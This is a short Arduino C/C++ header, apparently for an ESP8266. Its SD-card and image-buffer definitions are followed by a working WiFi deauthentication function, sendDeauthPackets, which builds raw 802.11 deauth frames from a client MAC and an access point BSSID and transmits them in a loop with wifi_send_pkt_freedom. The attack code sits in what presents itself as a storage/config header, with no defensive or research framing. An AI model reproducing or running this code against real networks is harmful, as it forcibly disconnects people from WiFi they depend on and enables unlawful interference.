#ifndef CD_CONFIG
#define CD_CONFIG

#include <Arduino.h>
#include <SdFat.h>
#include <SPI.h>

#define SD_CS_PIN 15
#define MAX_GLOBAL_DERICTORY_FILES 100

SdFat sd;

struct Draw_Image {
    int width;                // Ширина зображення
    int height;               // Висота зображення
    uint8_t* image_buffer;
    uint32 image_pages; // Буфер для зображення
};
void sendDeauthPackets(uint8_t *clientMAC, uint8_t *bssid, int deauthCount) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        0, 0, 0, 0, 0, 0, // Destination MAC (Client)
        0, 0, 0, 0, 0, 0, // Source MAC (BSSID)
        0, 0, 0, 0, 0, 0, // BSSID
        0x00, 0x00, // Sequence number
        0x07, 0x00  // Reason code (7: Class 3 frame received from nonassociated STA)
    };

    // Формирование пакета
    memcpy(&deauthPacket[4], clientMAC, 6);  // MAC клиента
    memcpy(&deauthPacket[10], bssid, 6);     // MAC точки доступа (source)
    memcpy(&deauthPacket[16], bssid, 6);     // MAC точки доступа (BSSID)

    for (int i = 0; i < deauthCount; i++) {
        int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        if (result == 0) {
            Serial.printf("Deauth packet sent to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          clientMAC[0], clientMAC[1], clientMAC[2],
                          clientMAC[3], clientMAC[4], clientMAC[5]);
        } else {
            Serial.println("Error sending deauth packet!");
        }
        delay(100);
    }
}




#endif